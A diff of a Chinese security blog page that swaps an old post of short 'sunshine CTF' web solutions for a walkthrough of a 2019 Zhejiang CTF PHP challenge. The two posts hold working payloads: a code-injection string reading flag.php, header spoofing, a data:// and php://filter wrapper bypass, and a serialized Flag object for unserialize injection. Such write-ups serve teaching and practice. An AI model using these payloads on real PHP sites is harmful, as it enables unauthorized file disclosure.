@@ -123,18 +123,21 @@
 
 
 
-<meta name="description" content="Evaluation观察源码看到REQUEST函数发现是php文件包含，hello是可控的，构造语句。 ?hello=);print_r(file(“./flag.php”));//  即可得到flag ​  Marceau抓包注意header下的Accept一行 1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*">
+<meta name="description" content="前言题目地址 https://www.ctfhub.com/#/challenge 浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维 0x00进入首页php代码如下 12345678910111213141516171819&amp;lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;passwor">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sunshine CTF web writeup">
-<meta property="og:url" content="elssm.github.io/2018/04/08/sunshine-CTF-web-writeup/index.html">
+<meta property="og:title" content="2019-Web-逆转思维 WriteUp">
+<meta property="og:url" content="elssm.github.io/2022/12/06/2019-Web-逆转思维-WriteUp/index.html">
 <meta property="og:site_name" content="ELSSM&#39;s Blog">
-<meta property="og:description" content="Evaluation观察源码看到REQUEST函数发现是php文件包含，hello是可控的，构造语句。 ?hello=);print_r(file(“./flag.php”));//  即可得到flag ​  Marceau抓包注意header下的Accept一行 1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*">
+<meta property="og:description" content="前言题目地址 https://www.ctfhub.com/#/challenge 浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维 0x00进入首页php代码如下 12345678910111213141516171819&amp;lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;passwor">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-04-08T11:34:02.000Z">
+<meta property="og:image" content="/2022/12/06/2019-Web-逆转思维-WriteUp/1.png">
+<meta property="og:image" content="/2022/12/06/2019-Web-逆转思维-WriteUp/2.png">
+<meta property="og:updated_time" content="2022-12-06T06:39:17.328Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sunshine CTF web writeup">
-<meta name="twitter:description" content="Evaluation观察源码看到REQUEST函数发现是php文件包含，hello是可控的，构造语句。 ?hello=);print_r(file(“./flag.php”));//  即可得到flag ​  Marceau抓包注意header下的Accept一行 1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*">
+<meta name="twitter:title" content="2019-Web-逆转思维 WriteUp">
+<meta name="twitter:description" content="前言题目地址 https://www.ctfhub.com/#/challenge 浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维 0x00进入首页php代码如下 12345678910111213141516171819&amp;lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;passwor">
+<meta name="twitter:image" content="/2022/12/06/2019-Web-逆转思维-WriteUp/1.png">
 
 
 
@@ -164,13 +167,13 @@
 
 
 
-  <link rel="canonical" href="elssm.github.io/2018/04/08/sunshine-CTF-web-writeup/">
+  <link rel="canonical" href="elssm.github.io/2022/12/06/2019-Web-逆转思维-WriteUp/">
 
 
 
 
 
-  <title>sunshine CTF web writeup | ELSSM's Blog</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <title>2019-Web-逆转思维 WriteUp | ELSSM's Blog</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
 
 
@@ -297,7 +300,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="elssm.github.io/2018/04/08/sunshine-CTF-web-writeup/">
+    <link itemprop="mainEntityOfPage" href="elssm.github.io/2022/12/06/2019-Web-逆转思维-WriteUp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Elssm">
@@ -314,7 +317,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sunshine CTF web writeup</h1>
+          <h1 class="post-title" itemprop="name headline">2019-Web-逆转思维 WriteUp</h1>
         
 
         <div class="post-meta">
@@ -326,8 +329,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-08T18:50:09+08:00">
-                2018-04-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-12-06T14:36:29+08:00">
+                2022-12-06
               </time>
             
 
@@ -364,18 +367,28 @@
       
 
       
-        <ul>
-<li><h2 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h2><p>观察源码看到REQUEST函数发现是php文件包含，hello是可控的，构造语句。</p>
-<p>?hello=);print_r(file(“./flag.php”));//  即可得到flag</p>
-<p>​</p>
-</li>
-<li><h2 id="Marceau"><a href="#Marceau" class="headerlink" title="Marceau"></a>Marceau</h2><p>抓包注意header下的Accept一行</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br></pre></td></tr></table></figure>
-<h5 id="将其中的text-html修改为text-php，得到flag"><a href="#将其中的text-html修改为text-php，得到flag" class="headerlink" title="将其中的text/html修改为text/php，得到flag"></a>将其中的text/html修改为text/php，得到flag</h5><p>​</p>
-</li>
-<li><h2 id="Home-Sweet-Home"><a href="#Home-Sweet-Home" class="headerlink" title="Home Sweet Home"></a>Home Sweet Home</h2><p>抓包直接添加信息 x-forward-for: 127.0.0.1，forward后直接在页面看到flag</p>
-</li>
-</ul>
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>题目地址</p>
+<p><a href="https://www.ctfhub.com/#/challenge" target="_blank" rel="noopener">https://www.ctfhub.com/#/challenge</a></p>
+<p>浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维</p>
+<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>进入首页<code>php</code>代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>get</code>请求接收三个参数，第一个if判断成立可以通过<code>data</code>协议</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/12/06/2019-Web-逆转思维-WriteUp/1.png" alt="1"></p>
+<p>第二个if判断不能包含<code>flag</code>字符，因此我们可以先通过<code>php://filter</code>协议获取<code>useless.php</code>文件源码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
+<p>得到<code>base64</code>编码文件如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</span><br></pre></td></tr></table></figure>
+<p>解密后获取<code>useless.php</code>源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>对于<code>password</code>的传值，通过构造<code>flag.php</code>的序列化，让<code>password</code>等于<code>flag.php</code>的序列化输出就行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$flag = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize($flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到的结果为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>最终<code>get</code>请求参数为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p><img src="/2022/12/06/2019-Web-逆转思维-WriteUp/2.png" alt="2"></p>
+<p>flag为<code>ctfhub{19a6a30e7f1e76f5a60dc63c}</code></p>
 
       
     </div>
@@ -406,8 +419,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/08/读《代码审计》的一些笔记/" rel="next" title="读《代码审计》的一些笔记">
-                <i class="fa fa-chevron-left"></i> 读《代码审计》的一些笔记
+              <a href="/2022/12/04/ThinkJava-CTF-WriteUp/" rel="next" title="ThinkJava CTF WriteUp">
+                <i class="fa fa-chevron-left"></i> ThinkJava CTF WriteUp
               </a>
             
           </div>
@@ -415,10 +428,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/04/14/DDCTF-writeup/" rel="prev" title="DDCTF writeup">
-                DDCTF writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -559,7 +568,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Evaluation"><span class="nav-number">1.</span> <span class="nav-text">Evaluation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Marceau"><span class="nav-number">2.</span> <span class="nav-text">Marceau</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#将其中的text-html修改为text-php，得到flag"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">将其中的text/html修改为text/php，得到flag</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#Home-Sweet-Home"><span class="nav-number">3.</span> <span class="nav-text">Home Sweet Home</span></a></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00"><span class="nav-number">2.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01"><span class="nav-number">3.</span> <span class="nav-text">0x01</span></a></li></ol></div>
             
 
           </div>
